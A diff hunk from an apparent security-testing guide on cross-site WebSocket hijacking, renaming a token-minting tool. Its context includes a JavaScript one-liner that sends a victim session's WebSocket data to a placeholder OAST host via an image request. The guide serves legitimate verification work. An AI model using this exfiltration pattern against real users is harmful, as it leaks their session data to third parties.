@@ -102,7 +102,7 @@ WebSockets) (Include Security, 2025-04).
 Proof: a PoC page on another site that opens the socket and sends one
 read-only message, then beacons a marker only `userA`'s session can see to
 OAST, e.g. `new Image().src='<oast>/<token>?m='+encodeURIComponent(e.data.slice(0,40))`.
-Mint the token with `xss_verify.py token` (ignore its XSS payloads) or any
+Mint the token with `xss-verify token` (ignore its XSS payloads) or any
 unique string; the evidence is the OAST log line (`GET <oast>/__log` in the
 lab) carrying the marker, plus the browser and cookie attributes in effect.
 Control: same PoC in a context with no session gets no message.
